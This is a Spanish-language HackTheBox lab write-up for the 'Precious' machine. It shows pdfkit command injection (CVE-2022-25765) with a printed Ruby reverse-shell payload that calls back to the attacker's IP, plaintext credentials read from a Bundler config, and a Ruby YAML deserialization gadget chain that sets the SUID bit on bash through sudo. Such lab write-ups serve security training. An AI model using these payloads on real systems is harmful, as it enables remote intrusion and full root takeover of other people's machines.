---
title: Precious
os: Linux
published: 2026-06-04
tags: [pdfkit, Command Injection, CVE-2022-25765, Information Leakage, User Pivoting, Abusing sudoers, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Pdfkit v0.8.6 Exploitation - Command Injection (CVE-2022-25765)
- Advanced Python Scripting - Autopwn Script [EXTRA]
- Information Leakage [User Pivoting]
- Abusing sudoers privilege + Yaml Deserialization Attack [Privilege Escalation]

### Preparación

- eWPT

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.98 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```
nmap -sVC -p22,80 10.129.228.98 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web

Vamos a ver que contiene la web, que de primeras nos redirige a `precious.htb` por lo que deberemos añadirlo al `/etc/hosts`:

![Web Image](./1.png)

Parece que convierte webs a PDF, vamos a probar con **netcat** a enviarnos una solicitud a nosotros mismos:

```bash
❯ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.15.143] from (UNKNOWN) [10.129.228.98] 56922
GET / HTTP/1.1
Host: 10.10.15.143
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/10.0 Safari/602.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
```

Vamos a probar a descargar un PDF de prueba para ver sus metadatos: 

```bash
❯ exiftool example.pdf
ExifTool Version Number         : 13.55
File Name                       : example.pdf
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2026:06:04 22:29:23+02:00
File Access Date/Time           : 2026:06:04 22:30:33+02:00
File Inode Change Date/Time     : 2026:06:04 22:30:03+02:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

Aquí si que vemos algo interesante `Generated by pdfkit v0.8.6`, vamos a ver si tiene alguna vulnerabilidad:

```bash
❯ searchsploit pdfkit
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pdfkit v0.8.7.2 - Command Injection                                                                                                                                                                                   | ruby/local/51293.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
❯ searchsploit -m ruby/local/51293.py
  Exploit: pdfkit v0.8.7.2 - Command Injection
      URL: https://www.exploit-db.com/exploits/51293
     Path: /usr/share/exploitdb/exploits/ruby/local/51293.py
    Codes: CVE-2022–25765
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/alejandro/HTB/Precious/content/51293.py
```

# Explotación

## CVE-2022-25765

Bingo! Vamos a descargarla y usarla para obtener una reverse shell, ya que lo que hace este exploit es inyectar comandos lo que causa una ejecución remota:

```bash
❯ python3 exploit.py -s 10.10.15.143 8888 -w http://precious.htb -p url

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.15.143","8888"))'`
LOCALIP: 10.10.15.143:8888
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 8888".
WEBSITE: http://precious.htb
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.
```

```bash
❯ rl 8888
[rl] escuchando en 0.0.0.0:8888
[rl] esperando conexión...
[rl] conexión 10.129.228.98:45952  (32x248)
[rl] sesión activa  Ctrl+C para cerrar

<y rows 32 cols 248 -echo; export HISTFILE=/dev/null
ruby@precious:/var/www/pdfapp$ whoami
ruby
ruby@precious:/var/www/pdfapp$ cd /home/ruby
ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Jun  3 17:27 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 4 ruby ruby 4096 Jun  4 12:29 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

De primeras no vemos la **user flag**, vamos a tener que buscar un poco más, de primeras vemos un usuario llamado `henry`:

```bash
ruby@precious:/var/www/pdfapp$ cd /home/
ruby@precious:/home$ ls
henry  ruby
```

## Information Leakage

Investigando en la carpeta de `ruby`, encontramos las credenciales:

```bash
ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Jun  3 17:27 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 4 ruby ruby 4096 Jun  4 12:29 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ cd .bundle
ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Sabiendo que tenemos el puerto de **SSH** abierto, aprovecharemos para conectarnos por ahí:

```bash
❯ ssh henry@precious.htb
The authenticity of host 'precious.htb (10.129.228.98)' can't be established.
ED25519 key fingerprint is: SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU
This key is not known by any other names.
henry@precious:~$ whoami
henry
henry@precious:~$ cat user.txt 
a14a3a7e7a0dfcf...
```

# Escalada de privilegios

Comenzaremos viendo si `henry` tiene algun privilegio de sudoer con `sudo -l`:

```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Vemos que tiene acceso a ejecutar con **ruby** el siguiente archivo:

```bash title="/opt/update_dependencies.rb"
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

Hay una vulnerabilidad conocida como `Yaml Deserialization Attack`, buscando, encontramos este repositorio de Github donde nos explican como hacerlo: https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

Básicamente debemos crear el siguiente archivo:

```bash title="dependecies.yml"
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod u+s /bin/bash"
         method_id: :resolve
```

Donde en el parámetro `git_set` podremos ejecutar comandos como **root**, aprovecharemos para poder ejecutar `/bin/bash` como dicho usuario:

```bash
henry@precious:/tmp/test$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
	33: from /opt/update_dependencies.rb:17:in `<main>'
	32: from /opt/update_dependencies.rb:10:in `list_from_file'
	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
	19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
	18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
	14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
	13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
	12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
	11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
	10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
	9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
	8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
	7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
	6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
	5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
	3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
	2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
henry@precious:/tmp/test$ bash -p
bash-5.1# 
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
ee8450d4ed58d4...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/513)

---